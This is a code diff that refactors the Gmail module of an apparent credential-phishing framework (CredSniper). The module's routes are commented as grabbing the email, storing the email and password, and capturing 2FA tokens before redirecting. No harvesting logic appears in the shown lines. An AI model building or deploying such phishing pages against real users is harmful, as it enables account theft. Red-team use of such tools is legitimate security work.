@@ -2,6 +2,7 @@ from __future__ import print_function
 from flask import redirect, request, jsonify, Markup
 from os import system
 from core import functions
+from core.base_module import *
 import uuid
 import mechanicalsoup
 import bs4
@@ -9,23 +10,16 @@ import re, sys, time, random
 import time
 import json
 
-class GmailModule():
+class GmailModule(BaseModule):
     def __init__(self, enable_2fa=False):
-        self.env = None
-        self.name = 'gmail'
-        self.user = None
-        self.password = None
-        self.two_factor_token = None
-        self.two_factor_type = None
-        self.enable_2fa = enable_2fa
-        self.final_url = None
-        self.routes = [
-            { 'name':'main', 'url':'/'},                     # Main page
-            { 'name':'accounts', 'url':'/accounts'},         # Grab email
-            { 'name':'authenticate', 'url':'/authenticate'}, # Store email/password in .cache
-            { 'name':'redirect', 'url':'/redirect'},         # Store email/password/2fa in .sniped, redirects
-        ]
+        super().__init__(self)
 
+        self.set_name('gmail')
+        self.add_route('main', '/')
+        self.add_route('accounts', '/accounts')
+        self.add_route('authenticate', '/authenticate')
+        self.add_route('redirect', '/redirect')
+        self.enable_two_factor(enable_2fa)
 
     def main(self):
         next_url = '/accounts'
@@ -278,5 +272,6 @@ class GmailModule():
 
 # REQUIRED: When module is loaded, credsniper calls load()
 def load(enable_2fa=False):
+    '''Initial load() function called from importlib in the main CredSniper functionality.'''
     return GmailModule(enable_2fa)
 
